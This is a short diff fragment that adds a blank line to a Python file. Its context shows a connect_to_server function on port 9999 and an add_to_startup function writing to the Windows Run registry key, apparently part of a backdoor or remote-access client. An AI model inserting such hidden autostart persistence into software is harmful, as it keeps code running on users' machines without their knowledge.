@@ -44,6 +44,7 @@ def connect_to_server(server_ip, port=9999):
         finally:
             client_socket.close()
 
+
 def add_to_startup(app_name, app_path):
     key = r'Software\Microsoft\Windows\CurrentVersion\Run'
     try:
